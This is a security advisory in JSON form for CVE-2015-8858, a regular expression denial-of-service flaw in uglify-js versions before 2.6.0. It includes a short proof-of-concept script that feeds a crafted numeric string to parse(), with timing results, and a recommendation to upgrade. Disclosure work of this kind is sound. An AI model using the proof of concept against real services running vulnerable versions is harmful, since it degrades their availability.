@@ -1,0 +1,73 @@
+{
+  "id": "GHSA-c9f4-xj24-8jqx",
+  "summary": "Regular Expression Denial of Service in uglify-js",
+  "details": "Versions of `uglify-js` prior to 2.6.0 are affected by a regular expression denial of service vulnerability when malicious inputs are passed into the `parse()` method.\n\n\n### Proof of Concept\n\n```\nvar u = require('uglify-js');\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\nu.parse(\"var a = \" + genstr(process.argv[2], \"1\") + \".1ee7;\");\n```\n\n### Results\n```\n$ time node test.js 10000\nreal\t0m1.091s\nuser\t0m1.047s\nsys\t0m0.039s\n\n$ time node test.js 80000\nreal\t0m6.486s\nuser\t0m6.229s\nsys\t0m0.094s\n```\n\n\n## Recommendation\n\nUpdate to version 2.6.0 or later.",
+  "aliases": [
+    "CVE-2015-8858"
+  ],
+  "modified": "2023-11-08T03:58:03.623951Z",
+  "published": "2017-10-24T18:33:36Z",
+  "database_specific": {
+    "nvd_published_at": null,
+    "github_reviewed_at": "2020-06-16T21:30:50Z",
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "cwe_ids": [
+      "CWE-1333"
+    ]
+  },
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-8858"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-c9f4-xj24-8jqx"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.npmjs.com/advisories/48"
+    },
+    {
+      "type": "WEB",
+      "url": "http://www.openwall.com/lists/oss-security/2016/04/20/11"
+    },
+    {
+      "type": "WEB",
+      "url": "http://www.securityfocus.com/bid/96409"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "name": "uglify-js",
+        "ecosystem": "npm",
+        "purl": "pkg:npm/uglify-js"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.6.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2017/10/GHSA-c9f4-xj24-8jqx/GHSA-c9f4-xj24-8jqx.json"
+      }
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ]
+}
